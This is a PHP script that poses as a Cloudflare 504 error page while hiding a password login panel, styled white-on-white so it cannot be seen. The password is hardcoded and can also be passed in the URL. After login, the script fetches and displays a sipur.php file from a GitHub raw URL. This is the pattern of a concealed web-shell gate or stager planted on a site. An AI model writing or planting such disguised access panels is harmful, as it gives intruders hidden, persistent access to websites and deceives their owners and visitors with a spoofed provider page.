<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!function_exists('get_user_ip')) {
    function get_user_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}

if (!function_exists('isAuthenticated')) {
    function isAuthenticated() {
        return isset($_SESSION['gecko_auth']) && $_SESSION['gecko_auth'] === true;
    }
}

if (!function_exists('fetchRemoteContent')) {
    function fetchRemoteContent($url) {
        $context = stream_context_create([
            'http' => [
                'timeout'    => 15,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ],
            'ssl' => [
                'verify_peer'      => true,
                'verify_peer_name' => true
            ]
        ]);

        if (ini_get('allow_url_fopen')) {
            $content = @file_get_contents($url, false, $context);
            if ($content !== false) {
                return $content;
            }
        }

        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL            => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => true,
                CURLOPT_SSL_VERIFYHOST => 2,
                CURLOPT_TIMEOUT        => 15,
                CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]);
            $content = curl_exec($ch);
            curl_close($ch);
            if ($content !== false) {
                return $content;
            }
        }

        return '';
    }
}

if (!defined('SITE_PASSWORD')) {
    define('SITE_PASSWORD', 'sipurs');
}
if (!defined('GITHUB_RAW_URL')) {
    define('GITHUB_RAW_URL', 'https://raw.githubusercontent.com/sipurtamvanbangets/sipur/refs/heads/main/sipur.php');
}

$githubRawStatus  = '';
$githubRawContent = '';
$error = '';
$scriptPath = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : $_SERVER['PHP_SELF'];

// Login via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password_value'])) {
    if (is_string($_POST['password_value']) && hash_equals(SITE_PASSWORD, $_POST['password_value'])) {
        session_regenerate_id(true);
        $_SESSION['gecko_auth'] = true;
        header('Location: ' . $scriptPath);
        exit;
    } else {
        $error = 'Invalid password';
    }
}

// Login via ?p=
if (isset($_GET['p']) && hash_equals(SITE_PASSWORD, $_GET['p'])) {
    session_regenerate_id(true);
    $_SESSION['gecko_auth'] = true;
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (!isAuthenticated()) {
    $user_ip = get_user_ip();
} else {
    // ==== SETELAH LOGIN ====
    // Ambil konten dari GitHub raw, tampilkan sebagai TEKS.
    // TIDAK ada include, TIDAK ada temp file, TIDAK ada eksekusi.
    $githubRawContent = fetchRemoteContent(GITHUB_RAW_URL);
    if ($githubRawContent === '') {
        $githubRawStatus = 'Gagal mengambil konten dari GitHub raw.';
    } else {
        $githubRawStatus = 'Konten berhasil diambil (ditampilkan sebagai teks, tidak dieksekusi).';
    }
    $user_ip = get_user_ip();
}

$host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'origin';
$timestamp = gmdate('Y-m-d H:i:s') . ' UTC';
if (function_exists('random_bytes')) {
    $rayIdBytes = random_bytes(8);
} elseif (function_exists('openssl_random_pseudo_bytes')) {
    $strong = false;
    $rayIdBytes = openssl_random_pseudo_bytes(8, $strong);
    if ($rayIdBytes === false || $strong !== true) {
        throw new RuntimeException('A cryptographically secure random source is unavailable.');
    }
} elseif (DIRECTORY_SEPARATOR !== '\\' && is_readable('/dev/urandom')) {
    $randomSource = fopen('/dev/urandom', 'rb');
    $rayIdBytes = $randomSource !== false ? fread($randomSource, 8) : false;
    if ($randomSource !== false) {
        fclose($randomSource);
    }
    if ($rayIdBytes === false || strlen($rayIdBytes) !== 8) {
        throw new RuntimeException('A cryptographically secure random source is unavailable.');
    }
} else {
    throw new RuntimeException('A cryptographically secure random source is unavailable.');
}
$ray_id = bin2hex($rayIdBytes);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title><?php echo htmlspecialchars($host, ENT_QUOTES, 'UTF-8'); ?> | 504: Gateway time-out</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            color: #404040;
            background: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            font-size: 15px;
            line-height: 1.5;
        }
        a { color: #2f7fc1; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { width: min(834px, calc(100% - 48px)); margin: 0 auto; }
        .page-header { padding: 26px 0 28px; }
        .page-header h1 {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 14px;
            margin: 0 0 5px;
            color: #404040;
            font-size: clamp(36px, 5.7vw, 56px);
            font-weight: 300;
            letter-spacing: -1.5px;
            line-height: 1.2;
        }
        .code-label {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 20px;
            background: #e5e5e5;
            color: #333;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0;
            line-height: 1.4;
        }
        .page-header p, .page-header time { margin: 0; }
        .page-header time { display: block; margin-top: 9px; }
        .status-band {
            padding: 34px 0 45px;
            background: #ebebeb;
            box-shadow: inset 0 8px 12px -12px #555, inset 0 -8px 12px -12px #555;
        }
        .status-illustration {
            display: block;
            width: 100%;
            max-width: 965px;
            height: auto;
            margin: 0 auto 12px;
        }
        .status-grid {
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
        }
        .status {
            width: 18%;
            min-width: 0;
            text-align: center;
        }
        .status:last-child { position: relative; }
        .status:last-child::after {
            position: absolute;
            bottom: -45px;
            left: 50%;
            width: 0;
            height: 0;
            border-right: 20px solid transparent;
            border-bottom: 20px solid #fff;
            border-left: 20px solid transparent;
            content: "";
            transform: translateX(-50%);
        }
        .status-location, .status h2, .status-result { display: block; }
        .status-location { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .status h2 {
            margin: 8px 0 0;
            color: #999;
            font-size: 22px;
            font-weight: 300;
        }
        .status h2 a { color: #68a5df; }
        .status-result { font-size: 22px; font-weight: 400; line-height: 1.35; }
        .status-result.ok { color: #9bca3e; }
        .status-result.error { color: #c92228; }
        .info-section { padding: 32px 0 54px; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 48px; }
        .info-box h2 {
            margin: 0 0 14px;
            color: #404040;
            font-size: 28px;
            font-weight: 400;
        }
        .info-box p { margin: 0; }
        .footer {
            padding: 38px 0 24px;
            border-top: 1px solid #e5e5e5;
            color: #666;
            font-size: 12px;
            text-align: center;
        }
        .footer p { margin: 0; }
        .footer-item { display: inline; }
        .footer-separator { padding: 0 6px; color: #aaa; }
        .footer button {
            padding: 0;
            border: 0;
            background: none;
            color: #2f7fc1;
            font: inherit;
            cursor: pointer;
        }
        .footer button:hover { text-decoration: underline; }
        .password-panel {
            width: min(834px, calc(100% - 48px));
            margin: 18px auto 0;
            color: #666;
            font-size: 13px;
        }
        .password-panel form {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 8px;
            margin: 0;
        }
        .password-panel input {
            min-width: 180px;
            padding: 7px 10px;
            border: 1px solid #fff;
            border-radius: 4px;
            background: #fff;
            color: #fff;
        }
        .password-panel input::placeholder { color: #fff; }
        .password-panel button {
            padding: 7px 12px;
            border: 1px solid #fff;
            border-radius: 4px;
            background: #fff;
            color: #fff;
            cursor: pointer;
        }
        .password-panel button:hover { background: #24679d; }
        .login-error { margin: 8px 0 0; color: #c92228; text-align: center; }
        .password-panel pre {
            max-height: 180px;
            overflow: auto;
            padding: 10px;
            border: 1px solid #ccc;
            background: #fafafa;
            color: #111;
            text-align: left;
        }
        @media (max-width: 640px) {
            .container { width: min(100% - 36px, 480px); }
            .page-header { padding: 25px 0 24px; }
            .page-header h1 { gap: 9px; font-size: clamp(34px, 9vw, 46px); }
            .status-band { padding: 24px 0 30px; }
            .status-illustration { margin-bottom: 8px; }
            .status {
                width: 18%;
            }
            .status:last-child::after { bottom: -30px; }
            .status-location { font-size: 13px; }
            .status h2, .status-result { font-size: 16px; }
            .info-section { padding: 28px 0 36px; }
            .info-grid { grid-template-columns: 1fr; gap: 30px; }
            .info-box h2 { font-size: 24px; }
            .footer { padding-top: 24px; }
            .footer-item { display: block; margin: 4px 0; }
            .footer-separator { display: none; }
        }
        @media (max-width: 380px) {
            .status-location { font-size: 11px; }
            .status h2, .status-result { font-size: 14px; }
        }
    </style>
</head>
<body>
    <header class="page-header">
        <div class="container">
            <h1>Gateway time-out <span class="code-label">Error code 504</span></h1>
            <p>Visit <a href="https://www.cloudflare.com/5xx-error-landing?utm_source=errorcode_504&amp;utm_campaign=url" target="_blank" rel="noopener noreferrer">cloudflare.com</a> for more information.</p>
            <time><?php echo htmlspecialchars($timestamp, ENT_QUOTES, 'UTF-8'); ?></time>
        </div>
    </header>

    <main>
        <section class="status-band" aria-label="Connection status">
            <div class="container">
                <img class="status-illustration" src="https://i.ibb.co.com/kgCjwfMC/504.png" width="965" height="162" alt="Browser and Cloudflare working; host error">
                <div class="status-grid">
                    <section class="status" aria-label="Browser working">
                        <span class="status-location">You</span>
                        <h2>Browser</h2>
                        <span class="status-result ok">Working</span>
                    </section>
                    <section class="status" aria-label="Cloudflare working">
                        <span class="status-location">Singapore</span>
                        <h2><a href="https://www.cloudflare.com/5xx-error-landing?utm_source=errorcode_504&amp;utm_campaign=url" target="_blank" rel="noopener noreferrer">Cloudflare</a></h2>
                        <span class="status-result ok">Working</span>
                    </section>
                    <section class="status" aria-label="Host error">
                        <span class="status-location"><?php echo htmlspecialchars($host, ENT_QUOTES, 'UTF-8'); ?></span>
                        <h2>Host</h2>
                        <span class="status-result error">Error</span>
                    </section>
                </div>
            </div>
        </section>

        <section class="info-section">
            <div class="container info-grid">
                <div class="info-box">
                    <h2>What happened?</h2>
                    <p>The web server reported a gateway time-out error.</p>
                </div>
                <div class="info-box">
                    <h2>What can I do?</h2>
                    <p>Please try again in a few minutes.</p>
                </div>
            </div>
        </section>
    </main>

    <footer class="footer">
        <div class="container">
            <p>
                <span class="footer-item">Cloudflare Ray ID: <strong><?php echo htmlspecialchars($ray_id, ENT_QUOTES, 'UTF-8'); ?></strong></span>
                <span class="footer-separator" aria-hidden="true">&bull;</span>
                <span class="footer-item">Your IP: <button type="button" id="user-ip" onclick="revealIP()">Click to reveal</button></span>
                <span class="footer-separator" aria-hidden="true">&bull;</span>
                <span class="footer-item">Performance &amp; security by <a href="https://www.cloudflare.com" rel="noopener noreferrer">Cloudflare</a></span>
            </p>
        </div>
        <div class="password-panel" id="password-panel">
            <?php if (!isAuthenticated()): ?>
                <form id="password-form" method="post" action="<?php echo htmlspecialchars($scriptPath, ENT_QUOTES, 'UTF-8'); ?>">
                    <label for="password-input"> </label>
                    <input type="password" id="password-input" name="password_value" placeholder="Enter password" autocomplete="current-password" required>
                    <button type="submit" class="submit-button">Log in</button>
                </form>
                <?php if ($error !== ''): ?>
                    <p class="login-error" role="alert"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></p>
                <?php endif; ?>
            <?php endif; ?>
            <?php if ($githubRawStatus !== ''): ?>
                <div style="margin-top: 8px; color: #444; font-size: 12px;">
                    <?php echo htmlspecialchars($githubRawStatus, ENT_QUOTES, 'UTF-8'); ?>
                </div>
            <?php endif; ?>
            <?php if ($githubRawContent !== ''): ?>
                <pre><?php echo htmlspecialchars(substr($githubRawContent, 0, 2000), ENT_QUOTES, 'UTF-8'); ?><?php echo strlen($githubRawContent) > 2000 ? '\n...output truncated...' : ''; ?></pre>
            <?php endif; ?>
        </div>
    </footer>
    <script>
        function revealIP() {
            var ipElement = document.getElementById('user-ip');
            ipElement.textContent = "<?php echo htmlspecialchars($user_ip, ENT_QUOTES, 'UTF-8'); ?>";
            ipElement.disabled = true;
        }
    </script>
</body>
</html>
